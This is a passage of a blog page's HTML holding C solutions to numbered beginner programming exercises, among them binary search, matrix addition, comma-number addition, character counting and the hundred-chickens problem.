class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            s[k+<span class="number">1</span>]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1042折半查找"><a href="#1042折半查找" class="headerlink" title="1042折半查找"></a>1042折半查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> data[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> d[], <span class="keyword">int</span> s, <span class="keyword">int</span> e, <span class="keyword">int</span> q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(s&lt;=e)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(s+e)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(d[mid]==q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d[mid]&lt;q)&#123;s=mid+<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;e=mid<span class="number">-1</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,m,s,e,q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,data+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;s,&amp;e,&amp;q);</span><br><span class="line">        <span class="keyword">if</span>(e&gt;n)&#123;e=n;&#125;</span><br><span class="line">        <span class="keyword">if</span>(s&gt;n<span class="number">-1</span>||s&gt;e<span class="number">-1</span>)&#123;<span class="built_in">printf</span>(<span class="string">"-1\n"</span>);<span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,binary_search(data,s,e<span class="number">-1</span>,q));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1043矩阵加法"><a href="#1043矩阵加法" class="headerlink" title="1043矩阵加法"></a>1043矩阵加法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M,N,a[<span class="number">11</span>][<span class="number">11</span>],b[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j,flag,num;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;M)==<span class="number">1</span>&amp;&amp;M!=<span class="number">0</span>&amp;&amp;<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;N)==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;=N; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;=N; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;b[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;=N; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j]+=b[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;=N; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i][j]!=<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;=M; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[j][i]!=<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1044逗号加法"><a href="#1044逗号加法" class="headerlink" title="1044逗号加法"></a>1044逗号加法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">20</span>],b[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> A,B,temp;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s %s"</span>,a,b)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        A=B=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; a[i]!=<span class="string">'\0'</span>; i++);</span><br><span class="line">        j=<span class="number">-1</span>;temp=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(--i&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]-<span class="string">'0'</span>&gt;<span class="number">-1</span>&amp;&amp;a[i]-<span class="string">'0'</span>&lt;<span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                j++;temp=<span class="number">10</span>*temp;</span><br><span class="line">                A+=(a[i]-<span class="string">'0'</span>)*temp/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(a[i]==<span class="string">','</span>)<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[i]==<span class="string">'-'</span>)A=-A;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; b[i]!=<span class="string">'\0'</span>; i++);</span><br><span class="line">        j=<span class="number">-1</span>;temp=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(--i&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[i]-<span class="string">'0'</span>&gt;<span class="number">-1</span>&amp;&amp;b[i]-<span class="string">'0'</span>&lt;<span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                j++;temp=<span class="number">10</span>*temp;</span><br><span class="line">                B+=(b[i]-<span class="string">'0'</span>)*temp/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(b[i]==<span class="string">','</span>)<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(b[i]==<span class="string">'-'</span>)B=-B;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,A+B);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1046统计字符"><a href="#1046统计字符" class="headerlink" title="1046统计字符"></a>1046统计字符</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">7</span>],na[<span class="number">7</span>],b[<span class="number">1001</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">while</span>(fgets(a,<span class="number">7</span>,<span class="built_in">stdin</span>)&amp;&amp;a[<span class="number">0</span>]!=<span class="string">'#'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; a[i]!=<span class="string">'\0'</span>; i++);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">7</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            na[j]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fgets(b,<span class="number">1000</span>,<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; b[k]!=<span class="string">'\0'</span>; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(b[k]==a[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    na[j]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i<span class="number">-1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c %d\n"</span>,a[j],na[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1048ZOJ"><a href="#1048ZOJ" class="headerlink" title="1048ZOJ"></a>1048ZOJ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z,o,j,i;</span><br><span class="line">    z=o=j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">while</span>(fgets(a,<span class="number">101</span>,<span class="built_in">stdin</span>)&amp;&amp;a[<span class="number">0</span>]!=<span class="string">'E'</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;a[i]!=<span class="string">'\0'</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="string">'Z'</span>)&#123;z++;<span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="string">'O'</span>)&#123;o++;<span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="string">'J'</span>)&#123;j++;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(z&gt;<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"Z"</span>);z--;&#125;</span><br><span class="line">            <span class="keyword">if</span>(o&gt;<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"O"</span>);o--;&#125;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"J"</span>);j--;&#125;</span><br><span class="line">            <span class="keyword">if</span>(z==<span class="number">0</span>&amp;&amp;o==<span class="number">0</span>&amp;&amp;j==<span class="number">0</span>)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);z=o=j=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1049不循环反转数组（递归）"><a href="#1049不循环反转数组（递归）" class="headerlink" title="1049不循环反转数组（递归）"></a>1049不循环反转数组（递归）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;<span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);reverse(i<span class="number">-1</span>);<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    reverse(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1050百鸡问题"><a href="#1050百鸡问题" class="headerlink" title="1050百鸡问题"></a>1050百鸡问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> x,y,z,n,i,j,k;</span><br><span class="line">   <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)==<span class="number">1</span>&amp;&amp;n!=EOF)&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n/<span class="number">5</span>+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;(n<span class="number">-5</span>*i)/<span class="number">3</span>+<span class="number">1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">5</span>*i+<span class="number">3</span>*j+(<span class="number">100</span>-i-j+<span class="number">2</span>)/<span class="number">3</span>&lt;n+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"x=%d,y=%d,z=%d\n"</span>,i,j,<span class="number">100</span>-i-j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1051折半查找’小于’临界点"><a href="#1051折半查找’小于’临界点" class="headerlink" title="1051折半查找’小于’临界点"></a>1051折半查找’小于’临界点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> data[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> d[], <span class="keyword">int</span> s, <span class="keyword">int</span> e, <span class="keyword">int</span> q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> s0=s,e0=e;</span><br><span class="line">   <span class="keyword">int</span> mid;</span><br><span class="line">   <span class="keyword">if</span>(d[s]&gt;q<span class="number">-1</span>)&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">   <span class="keyword">if</span>(d[e]&lt;q)&#123;<span class="keyword">return</span> e0-s0+<span class="number">1</span>;&#125;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    mid=(s+e)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(d[mid]&lt;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(d[mid+<span class="number">1</span>]&lt;q)&#123;s=mid+<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">return</span> mid-s0+<span class="number">1</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(d[mid]&gt;q)&#123;e=mid<span class="number">-1</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;e--;&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,m,s,e,q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,data+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;s,&amp;e,&amp;q);</span><br><span class="line">        <span class="keyword">if</span>(s==n||s==e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,binary_search(data,s,e<span class="number">-1</span>,q));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1052全排列"><a href="#1052全排列" class="headerlink" title="1052全排列"></a>1052全排列</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="comment">//#define D printf("m=%d\tproduct=%d\tstart=%d\ti=%d\tj=%d\tk=%d\tt=%d\n",m,product,start,i,j,k,t);</span></span><br><span class="line"><span class="comment">//#define M for(start=0;start&lt;len;start++)&#123;printf("%d ",index[start]);&#125;printf("\n");</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mySort</span><span class="params">(<span class="keyword">char</span>* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span 